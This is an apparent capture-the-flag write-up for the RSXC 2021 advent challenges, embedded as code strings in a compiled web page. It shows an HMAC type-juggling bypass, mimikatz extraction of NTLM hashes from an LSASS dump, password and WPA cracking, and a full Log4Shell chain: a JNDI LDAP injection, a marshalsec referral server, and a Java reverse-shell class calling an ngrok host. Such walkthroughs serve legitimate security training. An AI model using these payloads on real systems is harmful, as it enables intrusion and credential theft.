<span class="token variable">$hmac</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"host"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$secret</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"sha256"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$hmac</span> <span class="token operator">!=</span> <span class="token variable">$data</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'hmac'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
  <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"HTTP/1.0 403 Forbidden"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span></span></code>`,$u,T,X1,Bl,G1,q1,$l,B1,$1,Ql,Q1,L1,Ll,K1,sb,Kl,ab,nb,Qu,Kn,hT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> --data <span class="token string">'&#123;"host":"", "hmac":""&#125;'</span> --header <span class="token string">'Content-Type: application/json'</span> http://rsxc.no:20020/api.php
RSXC<span class="token punctuation">&#123;</span>You_have_to_have_the_right_order_for_arguments<span class="token operator">!</span><span class="token punctuation">&#125;</span></code>`,Lu,se,eb,sc,tb,Ku,ae,Fo,ob,sk,ne,zo,pb,ak,Co,Do,lb,ms,cb,nk,ee,Yo,ib,ek,A,rb,ac,ub,kb,nc,fb,hb,tk,te,dT=`<code class="language-shell">$ .<span class="token punctuation"></span>mimikatz.exe

  <span class="token builtin class-name">.</span><span class="token comment">#####.   mimikatz 2.2.0 (x64) #19041 Sep 18 2020 19:18:29</span>
 <span class="token builtin class-name">.</span><span class="token comment">## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)</span>
 <span class="token comment">## /  ##  /*** Benjamin DELPY &#96;gentilkiwi&#96; ( benjamin@gentilkiwi.com )</span>
 <span class="token comment">##  / ##       > https://blog.gentilkiwi.com/mimikatz</span>
 <span class="token string">'## v ##'</span>       Vincent LE TOUX             <span class="token punctuation">(</span> vincent.letoux@gmail.com <span class="token punctuation">)</span>
  <span class="token string">'#####'</span>        <span class="token operator">></span> https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz <span class="token comment"># sekurlsa::minidump lsass.DMP</span>
Switch to MINIDUMP <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span>

mimikatz <span class="token comment"># sekurlsa::logonpasswords</span>
Opening <span class="token builtin class-name">:</span> <span class="token string">'lsass.DMP'</span> <span class="token function">file</span> <span class="token keyword">for</span> minidump<span class="token punctuation">..</span>.

Authentication Id <span class="token builtin class-name">:</span> <span class="token number">0</span> <span class="token punctuation">;</span> <span class="token number">1304254</span> <span class="token punctuation">(</span>00000000:0013e6be<span class="token punctuation">)</span>
Session           <span class="token builtin class-name">:</span> Interactive from <span class="token number">2</span>
User Name         <span class="token builtin class-name">:</span> river-security-xmas
Domain            <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
Logon Server      <span class="token builtin class-name">:</span> WIN-QC6FTBKEEE9
Logon Time        <span class="token builtin class-name">:</span> <span class="token number">2021</span>-11-12 <span class="token number">13</span>:29:30
SID               <span class="token builtin class-name">:</span> S-1-5-21-2640804858-4017698289-1413954960-1001
        msv <span class="token builtin class-name">:</span>
         <span class="token punctuation">[</span>00000003<span class="token punctuation">]</span> Primary
         * Username <span class="token builtin class-name">:</span> river-security-xmas
         * Domain   <span class="token builtin class-name">:</span> DESKTOP-V1MQH3P
         * NTLM     <span class="token builtin class-name">:</span> 7801ee9c5762bb027ee224d54cb8f62e
         * SHA1     <span class="token builtin class-name">:</span> bebad302f8e64b59279c3a6747db0e076800d9ca
<span class="token punctuation">..</span>.</code>`,ok,y,db,ec,mb,bb,tc,gb,vb,oc,_b,wb,pc,Eb,Tb,lc,yb,Vb,pk,oe,mT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token builtin class-name">echo</span> <span class="token string">"7801ee9c5762bb027ee224d54cb8f62e"</span> <span class="token operator">></span> <span class="token builtin class-name">hash</span>
juki@izone:~/Desktop/ctf/rsxc2021$ john --format<span class="token operator">=</span>nt --wordlist<span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hashes
Using default input encoding: UTF-8
Loaded <span class="token number">1</span> password <span class="token builtin class-name">hash</span> <span class="token punctuation">(</span>NT <span class="token punctuation">[</span>MD4 <span class="token number">128</span>/128 XOP 4x2<span class="token punctuation">]</span><span class="token punctuation">)</span>
Warning: no OpenMP support <span class="token keyword">for</span> this <span class="token builtin class-name">hash</span> type, consider --fork<span class="token operator">=</span><span class="token number">4</span>
Press <span class="token string">'q'</span> or Ctrl-C to abort, almost any other key <span class="token keyword">for</span> status
alliwantforchristmasisyou <span class="token punctuation">(</span>?<span class="token punctuation">)</span>
1g <span class="token number">0</span>:00:00:01 DONE <span class="token punctuation">(</span><span class="token number">2021</span>-12-21 <span class="token number">13</span>:08<span class="token punctuation">)</span> <span class="token number">0</span>.7462g/s 7621Kp/s 7621Kc/s 7621KC/s alliwantisy0oh<span class="token punctuation">..</span>allitaite10
Use the <span class="token string">"--show --format=NT"</span> options to display all of the cracked passwords reliably
Session completed</code>`,lk,pe,xb,cc,Ub,ck,le,Zo,Rb,ik,ce,Jo,Nb,rk,jo,ic,Wb,uk,ie,Po,Sb,kk,v,Mb,rc,Ib,Ob,uc,Fb,zb,kc,Cb,Db,fc,Yb,Zb,hc,Jb,jb,dc,Pb,Hb,fk,Ms,Ab,mc,Xb,Gb,hk,re,bT=`<code class="language-python=">f2 = open(&quot;filtered.txt&quot;, &quot;a&quot;)
with open(&quot;/usr/share/wordlists/rockyou.txt&quot;, &quot;rb&quot;) as f:
    a = [x for x in f.readlines()]
    for line in a:
        try:
            if line[0] == 83: # &quot;S&quot;
                f2.write(line.decode())
        except:
            pass
f2.close()</code>`,dk,Ho,qb,mk,ue,gT=`<code class="language-undefined">juki@izone:~/Desktop/ctf/rsxc2021$ aircrack-ng 22-challenge.cap -w filtered.txt
Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

   #  BSSID              ESSID                     Encryption

   1  1A:2F:49:69:AA:0A  Private                   WPA (1 handshake)

Choosing first network as target.

Reading packets, please wait...
Opening 22-challenge.cap
Read 63 packets.

1 potential targets



                               Aircrack-ng 1.6

      [00:01:28] 97735/98553 keys tested (1118.76 k/s)

      Time left: 0 seconds                                      99.17%

                         KEY FOUND! [ Santaclaws99 ]


      Master Key     : 98 91 0D 48 C4 92 05 45 42 CB 4C AF 72 3B 11 C8
                       EA EB BE 40 FD 9A 01 E8 43 D8 A2 F0 AD 36 37 DD

      Transient Key  : 77 3D 16 7F 4D C5 78 93 1F C9 2C 58 1F 82 9A 6C
                       A7 FF 49 BB 44 20 9C 07 D5 BD 72 B7 0E 47 39 51
                       AD 5D DA 9D AD D8 87 6F DE 5E 86 F5 33 FB 8B 18
                       4B FD D7 06 8D 6C 8A 34 36 77 D7 E1 AA 7F 93 8E

      EAPOL HMAC     : 7C 95 55 6F 18 39 03 44 43 64 CD D0 AB 25 89 0B

</code>`,bk,Is,Bb,bc,$b,Qb,gk,Os,Ao,gc,ug,Xo,vc,kg,vk,ke,_c,fg,_k,fe,Lb,wc,Kb,wk,he,Go,s0,Ek,de,qo,a0,Tk,Bo,$o,n0,bs,e0,yk,me,Qo,t0,Vk,X,o0,Ec,p0,l0,Tc,c0,i0,xk,G,r0,yc,u0,k0,Vc,f0,h0,Uk,be,vT=`<code class="language-python">f2 <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"small.txt"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span>
<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"/usr/share/wordlists/dirb/small.txt"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
    a <span class="token operator">=</span> <span class="token punctuation">[</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">for</span> line <span class="token keyword">in</span> a<span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f2<span class="token punctuation">.</span>write<span class="token punctuation">(</span>line<span class="token operator">+</span><span class="token string">"/flag.txt"</span><span class="token operator">+</span><span class="token string">"&#92;n"</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">pass</span>
f2<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code>`,Rk,Fs,d0,xc,m0,b0,Nk,ge,_T=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ gobuster -fw -u http://rsxc.no:20023/ -w small.txt -l -o result
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">head</span> result -n <span class="token number">10</span>
/03/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/10/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/01/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/00/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/100/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/1000/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/123/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/0/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
/02/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">20</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">grep</span> -v <span class="token string">"Size: 20"</span> result <span class="token comment"># since [Size: 20] should indicate the message "404 - File not found"</span>
/logfile/flag.txt <span class="token punctuation">(</span>Status: <span class="token number">200</span><span class="token punctuation">)</span> <span class="token punctuation">[</span>Size: <span class="token number">120</span><span class="token punctuation">]</span>
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -s http://rsxc.no:20023/logfile/flag.txt <span class="token operator">|</span> <span class="token function">grep</span> -Eo <span class="token string">"RSXC&#123;.*&#125;"</span>
RSXC<span class="token punctuation">&#123;</span>Content_discovery_is_a_useful_to_know.Good_job_finding_the_flag<span class="token punctuation">&#125;</span></code>`,Wk,ve,g0,Uc,v0,Sk,_e,Lo,_0,Mk,we,Ko,w0,Ik,sp,ap,E0,gs,T0,Ok,Ee,np,y0,Fk,_,V0,Rc,x0,U0,Nc,R0,N0,Wc,W0,S0,Sc,M0,I0,Mc,O0,F0,Ic,z0,C0,zk,ep,Oc,D0,Ck,zs,Y0,vs,Z0,J0,Dk,Te,wT=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53502</span>
<span class="token number">0</span>
 &#96;\uFFFD</code>`,Yk,ye,ET=`<code class="language-shell">juki@izone:~$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://4.tcp.ngrok.io:14996/a&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span></code>`,Zk,tp,j0,Jk,op,P0,jk,z,Ve,H0,Fc,A0,X0,G0,zc,q0,B0,Cc,$0,Pk,q,Q0,Dc,L0,K0,Yc,s3,a3,Hk,xe,TT=`<code class="language-undefined"># Computer 1
tcp://8.tcp.ngrok.io:16405 -&gt; localhost:1389 # LDAP Referral Server
http://calm-warthog-89.loca.lt -&gt; localhost:8000 # HTTP server

# Computer 2
tcp://4.tcp.ngrok.io:14996 -&gt; localhost:9001 # Netcat reverse shell</code>`,Ak,Cs,n3,_s,e3,t3,Xk,Ue,yT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021/marshalsec$ java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="token string">"http://calm-warthog-89.loca.lt/#Exploit"</span>
Listening on <span class="token number">0.0</span>.0.0:1389</code>`,Gk,pp,o3,qk,Re,VT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ python3 -m http.server
Serving HTTP on <span class="token number">0.0</span>.0.0 port <span class="token number">8000</span> <span class="token punctuation">(</span>http://0.0.0.0:8000/<span class="token punctuation">)</span> <span class="token punctuation">..</span></code>`,Bk,Ne,xT=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span></code>`,$k,Ds,p3,Zc,l3,c3,Qk,We,UT=`<code class="language-java"><span class="token comment">// Exploit.java</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">OutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">Socket</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exploit</span> <span class="token punctuation">&#123;</span>

	<span class="token keyword">public</span> <span class="token class-name">Exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
		<span class="token class-name">String</span> host<span class="token operator">=</span><span class="token string">"4.tcp.ngrok.io"</span><span class="token punctuation">;</span>
		<span class="token keyword">int</span> port<span class="token operator">=</span><span class="token number">14996</span><span class="token punctuation">;</span>
		<span class="token class-name">String</span> cmd<span class="token operator">=</span><span class="token string">"/bin/sh"</span><span class="token punctuation">;</span>
		<span class="token class-name">Process</span> p<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ProcessBuilder</span><span class="token punctuation">(</span>cmd<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">redirectErrorStream</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">Socket</span> s<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Socket</span><span class="token punctuation">(</span>host<span class="token punctuation">,</span>port<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">InputStream</span> pi<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								pe<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getErrorStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
								si<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token class-name">OutputStream</span> po<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>
				po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token class-name">Thread</span><span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
				p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
				<span class="token keyword">break</span><span class="token punctuation">;</span>
			<span class="token punctuation">&#125;</span>
			<span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
			<span class="token punctuation">&#125;</span>
		<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
		p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code>`,Lk,lp,i3,Kk,Se,RT=`<code class="language-shell">juki@izone:~/Desktop/ctf/rsxc2021$ javac Exploit.java -source <span class="token number">8</span> -target <span class="token number">8</span>
warning: <span class="token punctuation">[</span>options<span class="token punctuation">]</span> bootstrap class path not <span class="token builtin class-name">set</span> <span class="token keyword">in</span> conjunction with -source <span class="token number">8</span>
<span class="token number">1</span> warning
juki@izone:~/Desktop/ctf/rsxc2021$ <span class="token function">curl</span> -H <span class="token string">'User-Agent: $&#123;jndi:ldap://8.tcp.ngrok.io:16405/Exploit&#125;'</span> <span class="token string">'http://rsxc.no:20024'</span>
</code>`,sf,Ys,r3,Jc,u3,k3,af,Me,NT=`<code class="language-shell">juki@peko:~$ <span class="token function">nc</span> -lvnp <span class="token number">9001</span>
Listening on <span class="token number">0.0</span>.0.0 <span class="token number">9001</span>
Connection received on <span class="token number">127.0</span>.0.1 <span class="token number">53624</span>
<span class="token function">ls</span>
app
bin
dev
etc
flag.txt
home
lib
media
mnt
proc
root
run
sbin
srv
sys
tmp
usr
var
<span class="token function">cat</span> flag.txt
RSXC<span class="token punctuation">&#123;</span>We_do_like_logging_right?<span class="token punctuation">&#125;</span>
<span class="token function">env</span>
<span class="token assign-left variable">JAVA_ALPINE_VERSION</span><span class="token operator">=</span><span class="token number">8.181</span>.13-r0
<span class="token assign-left variable"><span class="token environment constant">HOSTNAME</span></span><span class="token operator">=</span>040a0b24af81
<span class="token assign-left variable">LD_LIBRARY_PATH</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64/server:/usr/lib/jvm/java-1.8-openjdk/jre/lib/amd64:/usr/lib/jvm/java-1.8-openjdk/jre/<span class="token punctuation">..</span>/lib/amd64
<span class="token assign-left variable"><span class="token environment constant">SHLVL</span></span><span class="token operator">=</span><span class="token number">1</span>
<span class="token assign-left variable"><span class="token environment constant">HOME</span></span><span class="token operator">=</span>/root
<span class="token assign-left variable">JAVA_VERSION</span><span class="token operator">=</span>8u181
<span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/lib/jvm/java-1.8-openjdk/jre/bin:/usr/lib/jvm/java-1.8-openjdk/bin
<span class="token assign-left variable"><span class="token environment constant">LANG</span></span><span class="token operator">=</span>C.UTF-8
<span class="token assign-left variable">JAVA_HOME</span><span class="token operator">=</span>/usr/lib/jvm/java-1.8-openjdk
<span class="token assign-left variable"><span class="token environment constant">PWD</span></span><span class="token operator">=</span>/
<span class="token assign-left variable">FLAG</span><span class="token operator">=</span>base32_KJJVQQ33K5SV6ZDPL5WGS23FL5WG6Z3HNFXGOX3SNFTWQ5B7PU</code>`,nf,Ie,f3,jc,h3;return{c(){h=e("p"),C=c("Here is Shirajuki\u2019s write-up of the challenges of the company River Security\u2019s capture the flag advent calendar for 2021, RSXC."),D=u(),O=e("h2"),d=e("a"),F=c("[DAY 1] The search"),js=u(),Ps=e("h3"),ze=e("a"),yf=c("Challenge"),Pc=u(),ws=e("blockquote"),Hs=e("p"),Vf=c("Welcome to the River Security XMas Challenge (RSXC)! RSXC operates with the following flag format for most challenges "),vp=e("code"),xf=c("RSXC{flag}"),Uf=c(". If another flag format is used, the challenge text will mention this."),Rf=u(),_p=e("p"),Nf=c("In this first challenge we have managed to forget which port we are listening on. Could you please find the port listening for traffic? We know it\u2019s in the range 30 000-31 000."),Hc=u(),As=e("h3"),Ce=e("a"),Wf=c("Solution"),Ac=u(),De=e("p"),Sf=c("We have been told that there is an open port in the range 30000 - 31000 on the traffic of the domain. Using the network exploration tool and security, or port scanner tool, nmap. We easily find the port:"),Xc=u(),Xs=e("pre"),Gc=u(),Gs=e("p"),Mf=c("The flag is: "),wp=e("code"),If=c("RSXC{Congrats!You_found_the_secret_port_I_was_trying_to_hide!}"),qc=u(),qs=e("h2"),Ye=e("a"),Of=c("[DAY 2] A magic word"),Bc=u(),Bs=e("h3"),Ze=e("a"),Ff=c("Challenge"),$c=u(),Es=e("blockquote"),Ep=e("p"),zf=c("We have found a magical port that is listening on port 20002, maybe you can find todays flag there?"),Cf=u(),Tp=e("p"),Df=c("rsxc.no:20002"),Qc=u(),$s=e("h3"),Je=e("a"),Yf=c("Solution"),Lc=u(),Y=e("p"),Zf=c("We know that there is an open port at 20002, connecting to it using the tool "),yp=e("code"),Jf=c("netcat"),jf=c(", we see that it takes in an input and outputs "),Vp=e("code"),Pf=c('"That is not the byte I want!"'),Hf=c(" whenever the user writes in the wrong input."),Kc=u(),Qs=e("pre"),si=u(),je=e("p"),Af=c("From the message and the title of the challenge, I guessed that only by inputting the correct letter or byte, will the flag be given. I hacked together a quick Python script with the help of pwntools to send in all the bytes from 0 to 256:"),ai=u(),Ls=e("pre"),ni=u(),Ks=e("p"),Xf=c("The flag is "),xp=e("code"),Gf=c("RSXC{You_found_the_magic_byte_I_wanted_Good_job!}"),ei=u(),sa=e("h2"),Pe=e("a"),qf=c("[DAY 3] What does this mean?"),ti=u(),aa=e("h3"),He=e("a"),Bf=c("Challenge"),oi=u(),Ae=e("blockquote"),Xe=e("p"),$f=c(`When looking for the prizes to this challenge we came across some text we can\u2019t understand, can you help us figure out what it means?
`),$=e("a"),Qf=c("https://rsxc.no/274d11760e75cfd2c5f6a8a1198a6c19ddee702a8b7e26102e8e48f0212cc278/03-challenge.txt"),pi=u(),na=e("h3"),Ge=e("a"),Lf=c("Solution"),li=u(),ea=e("pre"),ci=u(),ta=e("p"),Kf=c("We are given a text file with the content of something looking like a base64 string. Knowing this, I began to believe that it could easily be solved using an online decryption tool like Cyberchef. Playing with the different operations in cyberchef and the use of the \u201CMagic\u201D tool does finally give us the flag: "),Q=e("a"),sh=c("https://gchq.github.io/CyberChef/#recipe=From_Base64(\u2018A-Za-z0-9%2B/%3D\u2019,true)From_Base58(\u2018rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz\u2019,false)Bzip2_Decompress(false)From_Base85(\u2018!-u\u2019)From_Morse_Code(\u2018Space\u2019,\u2018Line%20feed\u2019)From_Hex(\u2018Auto\u2019)From_Base32(\u2018A-Z2-7%3D\u2019,false)"),ii=u(),Ts=e("p"),ah=c("The flag is "),Up=e("code"),nh=c("RSXC{I_hope_you_used_cyber_chef_it_does_make_it_alot_easier}"),eh=c("."),ri=u(),oa=e("h2"),qe=e("a"),th=c("[DAY 4] 4 Bytes of XOR"),ui=u(),pa=e("h3"),Be=e("a"),oh=c("Challenge"),ki=u(),$e=e("blockquote"),Qe=e("p"),ph=c(`The flag of the day can be found by xor\u2019ing our text with 4 bytes.
`),L=e("a"),lh=c("https://rsxc.no/e26113731cc5514c745bd8f4bdfd43a25b3a9e2286f48fba887910f16e5ad049/04-challenge.txt"),fi=u(),la=e("h3"),Le=e("a"),ch=c("Solution"),hi=u(),ys=e("p"),ih=c("We are given a text file containing the encoded flag of the day. From the challenge description we know that it is encoded with XOR and the key is of 4 bytes. Knowing that a XOR cipher is insecure if the key used is smaller in length than the plaintext (ie. a repeating key). Another approach is to also bruteforce the key as it is also just 4 bytes. But as the flag format is known "),Rp=e("code"),rh=c("RSXC{"),uh=c(", we can essentially perform a simple known-plaintext attack, and find the key first then solve the challenge by further decoding the flag. A quick python script for the solution looks like this:"),di=u(),ca=e("pre"),mi=u(),ia=e("p"),kh=c("The flag is "),Np=e("code"),fh=c("RSXC{Most_would_say_XOR_isn't_that_useful_anymore}"),bi=u(),ra=e("h2"),Ke=e("a"),hh=c("[DAY 5] Plain discussion"),gi=u(),ua=e("h3"),st=e("a"),dh=c("Challenge"),vi=u(),at=e("blockquote"),nt=e("p"),mh=c(`A spy was listening in on some of our discussion about todays challenge. Can you figure out what he found?
`),K=e("a"),bh=c("https://rsxc.no/a28ac32e489c7714b63e26df0f8f0c71d0460e97b898299d32b30192f8f017af/05-challenge.pcap"),_i=u(),ka=e("h3"),et=e("a"),gh=c("Solution"),wi=u(),tt=e("p"),vh=c("We are given a pcap network traffic capture file containing unencrypted text messages, and as what one would normally do in a network traffic challenge is to begin looking at it and analyzing the different packets found in the .pcap file. Before doing that with wireshark however, I began by stringing the flag thinking that it might be a simple fast solution to the challenge, but there was nothing to be found at first."),Ei=u(),fa=e("pre"),Ti=u(),Vs=e("p"),_h=c("Following that I stringed for "),Wp=e("code"),wh=c("flag"),Eh=c(" which did give me enough result for solving the challenge, thus skipping the potential usage of wireshark completely."),yi=u(),ha=e("pre"),Vi=u(),ot=e("p"),Th=c("From the output above and the hint from the messages, I could guess that this challenge could be solved by extracting the password protected flag.zip file and then bruteforcing it using fcrackzip with the 10 digit long number constraints. Quite similar to some of the challenges I have done prior to this. Knowing the solution to this challenge, solving it and bruteforcing the zip file has become as trivial as running the following commands:"),xi=u(),da=e("pre"),Ui=u(),ma=e("p"),yh=c("The flag is "),Sp=e("code"),Vh=c("RSXC{Good_job_analyzing_the_pcap_did_you_see_the_hint?}"),Ri=u(),ba=e("h2"),pt=e("a"),xh=c("[DAY 6] The indecipherable cipher"),Ni=u(),ga=e("h3"),lt=e("a"),Uh=c("Challenge"),Wi=u(),ct=e("blockquote"),it=e("p"),Rh=c(`We recently did some research on some old ciphers, and found one that supposedly was indecipherable, but maybe you can prove them wrong?
